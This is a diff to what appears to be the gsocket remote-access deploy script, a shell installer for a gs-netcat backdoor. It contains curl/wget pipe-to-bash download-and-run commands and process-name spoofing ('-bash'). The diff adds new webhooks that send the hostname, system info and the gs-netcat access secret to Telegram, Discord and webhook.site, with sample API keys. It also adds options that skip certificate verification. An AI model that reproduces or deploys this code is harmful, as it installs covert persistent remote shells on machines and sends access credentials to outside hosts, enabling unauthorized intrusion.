@@ -39,8 +39,10 @@
 #       - Force architecutre to a specific package (for testing purpose only)
 # GS_PREFIX=path
 #		- Use 'path' instead of '/' (needed for packaging/testing)
-# GS_URL_BASE=https://github.com/hackerschoice/binary/raw/main/gsocket/bin/
+# GS_URL_BASE=gsocket.io
 #		- Specify URL of static binaries
+# GS_URL_BIN=https://github.com/hackerschoice/binary/raw/main/gsocket/bin/
+#		- Specify URL of static binaries, defaults to https://${GS_URL_BASE}/bin
 # GS_DSTDIR="/tmp/foobar/blah"
 #		- Specify custom installation directory
 # GS_HIDDEN_NAME="-bash"
@@ -51,34 +53,45 @@
 #       - Telegram Bot ID, =5794110125:AAFDNb...
 # GS_TG_CHATID
 #        - Telegram Chat ID, =-8834838383
+# GS_DISCORD_KEY
+#        - Discord API key, ="1106565073956253736/mEDRS5iY0S4sgUnRh8Q5pC4S54zYwczZhGOwXvR3vKr7YQmA0Ej1-Ig60Rh4P_TGFq-m"
+# GS_WEBHOOK_KEY
+#        - https://webhook.site key, ="dc3c1af9-ea3d-4401-9158-eb6dda735276"
 # TMPDIR=
 #       - Guess what...
 
 # Global Defines
-# URL_BASE="https://github.com/hackerschoice/binary/raw/main/gsocket/bin"
-URL_BASE="https://www.gsocket.io/bin"
-[[ -n $GS_URL_BASE ]] && URL_BASE="${GS_URL_BASE}"
+URL_BASE="gsocket.io"
+[[ -n $GS_URL_BASE ]] && URL_BASE="${GS_DOMAIN_BASE}"
+URL_BIN="https://${URL_BASE}/bin"
+URL_DEPLOY="${URL_BASE}/x"
+[[ -n $GS_URL_BIN ]] && URL_BIN="${GS_URL_BIN}"
+[[ -n $GS_URL_DEPLOY ]] && URL_DEPLOY="${GS_URL_DEPLOY}"
+
 # WEBHOOKS are executed after a successfull install
-# 1. Need a URL for WGET and CURL
-### Telegram example
-GS_TG_TOKEN=""
-GS_TG_CHATID=""
+msg='$(hostname) --- $(uname -rom) --- gs-netcat -i -s ${GS_SECRET}'
+### Telegram
+# GS_TG_TOKEN=""
+# GS_TG_CHATID=""
 [[ -n $GS_TG_TOKEN ]] && [[ -n $GS_TG_CHATID ]] && {
-	msg='$(hostname) --- $(uname -rom) --- gs-netcat -i -s ${GS_SECRET}'
 	GS_WEBHOOK_CURL=("--data-urlencode" "text=${msg}" "https://api.telegram.org/bot${GS_TG_TOKEN}/sendMessage?chat_id=${GS_TG_CHATID}&parse_mode=html")
 	GS_WEBHOOK_WGET=("https://api.telegram.org/bot${GS_TG_TOKEN}/sendMessage?chat_id=${GS_TG_CHATID}&parse_mode=html&text=${msg}")
-	unset msg
 }
-### webhook.site example
-# GS_WEBHOOK_CURL=("-duser=foo2" '-dpassword=${GS_SECRET}' "https://webhook.site/dc3c1af9-ea3d-4401-9158-eb6dda735276")
-# GS_WEBHOOK_WGET=("--post-data" 'user=foo&password=${GS_SECRET}' "https://webhook.site/dc3c1af9-ea3d-4401-9158-eb6dda735276")
-### A complex example:
-# GS_WEBHOOK_CURL=("curl" "-X" "POST" 'https://webhook.site/dc3c1af9-ea3d-4401-9158-eb6dda735276' \
-# 		"-H" "content-type: application/json" \
-# 		"-d" '$'\''{"id": 7, "name": "Jack Daniels", "position": "Assistant"}'\''')
+### webhook.site 
+[[ -n $GS_WEBHOOK_KEY ]] && {
+	data='{"hostname": "$(hostname)", "system": "$(uname -rom)", "access": "gs-netcat -i -s ${GS_SECRET}"}'
+	GS_WEBHOOK_CURL=('-H' 'Content-type: application/json' '-d' "${data}" "https://webhook.site/${GS_WEBHOOK_KEY}")
+	GS_WEBHOOK_WGET=('--header=Content-Type: application/json' "--post-data=${data}" "https://webhook.site/${GS_WEBHOOK_KEY}")
+}
+### discord webhook
+[[ -n $GS_DISCORD_KEY ]] && {
+	data='{"username": "gsocket", "content": "'"${msg}"'"}'
+	GS_WEBHOOK_CURL=('-H' 'Content-Type: application/json' '-d' "${data}" "https://discord.com/api/webhooks/${GS_DISCORD_KEY}")
+	GS_WEBHOOK_WGET=('--header=Content-Type: application/json' "--post-data=${data}" "https://discord.com/api/webhooks/${GS_DISCORD_KEY}")
+}
+unset data
+unset msg
 
-[[ -n "$GS_URL_BASE" ]] && URL_BASE="$GS_URL_BASE" # Use user supplied URL_BASE
-URL_DEPLOY="gsocket.io/x"
 # GS_VERSION=1.4.34
 DL_CRL="bash -c \"\$(curl -fsSL $URL_DEPLOY)\""
 DL_WGT="bash -c \"\$(wget -qO- $URL_DEPLOY)\""
@@ -702,11 +715,14 @@ init_vars()
 	[[ $GS_DL == "curl" ]] && DL_CMD="$DL_CRL"
 	if [[ "$DL_CMD" == "$DL_CRL" ]]; then
 		IS_USE_CURL=1
-		DL=("curl" "-fsL" "--connect-timeout" "5" "-m30" "--retry" "3")
+		DL=("curl" "-fsL" "--connect-timeout" "7" "-m30" "--retry" "3")
 		[[ -n $GS_DEBUG ]] && DL+=("-v")
+		[[ -n $GS_NOCERTCHECK ]] && DL+=("-k")
 	elif [[ "$DL_CMD" == "$DL_WGT" ]]; then
 		IS_USE_WGET=1
-		DL=("wget" "-qO-")
+		DL=("wget" "-qO-" "--connect-timeout=7" "--dns-timeout=7")
+		[[ -n $GS_NOCERTCHECK ]] && DL+=("--no-check-certificate")
+
 	else
 		DL=("false")   # Should not happen
 	fi
@@ -1186,13 +1202,11 @@ dl_ssl()
 		[[ "${DL_LOG}" != *"$sslerr"* ]] && return
 	fi
 
-	if [[ -z $GS_NOCERTCHECK ]]; then
-		SKIP_OUT
-		ask_nocertcheck
-	fi
+	FAIL_OUT "Certificate Error."
+	[[ -z $GS_NOCERTCHECK ]] && ask_nocertcheck
 	[[ -z $GS_NOCERTCHECK ]] && return
 
-	echo -en "Downloading binaries without certificate verification................."
+	echo -en "--> Downloading binaries without certificate verification............."
 	DL_LOG=$("$cmd" "$arg_nossl" "$@" 2>&1)
 }
 
@@ -1209,9 +1223,9 @@ dl()
 		FAIL_OUT "GS_USELOCAL set but deployment binaries not found (${1})..."
 		errexit
 	elif [[ -n $IS_USE_CURL ]]; then
-		dl_ssl "-k" "certificate problem" "${DL[@]}" "${URL_BASE}/${1}" "--output" "${2}"
+		dl_ssl "-k" "certificate problem" "${DL[@]}" "${URL_BIN}/${1}" "--output" "${2}"
 	elif [[ -n $IS_USE_WGET ]]; then
-		dl_ssl "--no-check-certificate" "is not trusted" "${DL[@]}" "${URL_BASE}/${1}" "-O" "${2}"
+		dl_ssl "--no-check-certificate" "is not trusted" "${DL[@]}" "${URL_BIN}/${1}" "-O" "${2}"
 	else
 		# errexit "Need curl or wget."
 		FAIL_OUT "CAN NOT HAPPEN"
@@ -1241,33 +1255,6 @@ gs_access()
 
 	exit_code "$ret"
 }
-
-# gs_update()
-# {
-# 	echo -en 2>&1 "Checking existing binaries............................................"
-
-# 	command -v gs-netcat >/dev/null || { FAIL_OUT "gs-netcat not found."; exit 255; }
-# 	OK_OUT
-
-# 	local gsnc_bin
-# 	gsnc_bin="$(command -v gs-netcat)"
-
-# 	echo -en 2>&1 "Backup old binaries..................................................."
-# 	err_log=$(mv -f "${gsnc_bin}" "${gsnc_bin}-old" 2>&1) || { FAIL_OUT "$err_log"; exit 255; }
-# 	OK_OUT
-
-# 	echo -en 2>&1 "Updating binaries....................................................."
-
-# 	err_log=$(mv -f "${DSTBIN}" "${gsnc_bin}" 2>&1) || { FAIL_OUT "$err_log"; exit 255; }
-# 	OK_OUT
-
-# 	echo -en 2>&1 "Testing updated binaries.............................................."
-# 	ver_new="$(gs-netcat -h 2>&1 | grep ^Version | sed -E 's/Version (.*),.*/\1/g')"
-# 	[[ "$ver_new" =~ $GS_VERSION ]] || { FAIL_OUT "Wrong version: $ver_new"; exit 255; }
-
-# 	OK_OUT "Updated to $ver_new"
-# 	exit 0
-# }
 
 # Binary is in an executeable directory (no noexec-flag)
 # set IS_TESTBIN_OK if binary worked.
@@ -1304,7 +1291,7 @@ test_network()
 	# 3. Exit=61 on GS-Connection refused. (server does not exist)
 	# Do not need GS_ENV[*] here because all env variables are exported
 	# when exec is used.
-	err_log=$(_GSOCKET_SERVER_CHECK_SEC=10 GS_ARGS="-s ${GS_SECRET}" exec -a "$PROC_HIDDEN_NAME" "${DSTBIN}" 2>&1)
+	err_log=$(_GSOCKET_SERVER_CHECK_SEC=15 GS_ARGS="-s ${GS_SECRET}" exec -a "$PROC_HIDDEN_NAME" "${DSTBIN}" 2>&1)
 	ret=$?
 
 	[[ -z "$ERR_LOG" ]] && ERR_LOG="$err_log"
@@ -1348,12 +1335,14 @@ do_webhook()
 	local arr
 	local IFS
 	local str
-	i=0
 
 	IFS=""
-	# Substitude any $SECRET variable etc.
+	# Expand any $SECRET variable, etc.
 	while [[ $# -gt 0 ]]; do
-        eval str=\""$1"\"
+		# We need to escape all " to "'"'" to pass 'eval' correctly.
+		# (Note: This _WILL_ expand $-style variables - what we want)
+		str=$(echo "$1" | sed "s/\x22/\x22'\x22'\x22/g")
+        eval str=\""$str"\"
 		arr+=("$str")
 		shift 1
 	done
@@ -1387,10 +1376,7 @@ try_network()
 {
 	echo -en "Testing Global Socket Relay Network..................................."
 	test_network
-	if [[ -n "$IS_TESTNETWORK_OK" ]]; then
-		OK_OUT
-		return
-	fi
+	[[ -n "$IS_TESTNETWORK_OK" ]] && { OK_OUT; return; }
 
 	FAIL_OUT
 	[[ -n "$ERR_LOG" ]] && echo >&2 "$ERR_LOG"
@@ -1447,7 +1433,6 @@ try_any()
 		[[ -n "$IS_TESTBIN_OK" ]] && break
 	done
 
-
 	if [[ -n "$IS_TESTBIN_OK" ]]; then
 		echo -e >&2 "--> ${CY}Installation did not go as smooth as it should have.${CN}"
 	else
@@ -1479,9 +1464,7 @@ gs_start_systemd()
 gs_start()
 {
 	# If installed as systemd then try to start it
-	if [[ -n "$IS_SYSTEMD" ]]; then
-		gs_start_systemd
-	fi
+	[[ -n "$IS_SYSTEMD" ]] && gs_start_systemd
 	[[ -n "$IS_GS_RUNNING" ]] && return
 
 	# Scenario to consider:
@@ -1549,7 +1532,7 @@ if [[ -z $S ]]; then
 		GS_SECRET="${GS_SECRET_X}"
 	fi
 
-	DEBUGF "GS_SECRET=$GS_SECRET (F=${GS_SECRET_FROM_FILE}, G=${GS_SECRET_X})"
+	DEBUGF "GS_SECRET=$GS_SECRET (F=${GS_SECRET_FROM_FILE}, X=${GS_SECRET_X})"
 else
 	GS_SECRET="$S"
 fi
@@ -1583,7 +1566,7 @@ else
 fi
 # -----END Install permanentally-----
 
-if [[ -z "$IS_INSTALLED" || -n $IS_DSTBIN_TMP ]]; then
+if [[ -z "$IS_INSTALLED" ]] || [[ -n $IS_DSTBIN_TMP ]]; then
 	echo -e >&2 "--> ${CR}Access will be lost after reboot.${CN}"
 fi
 	
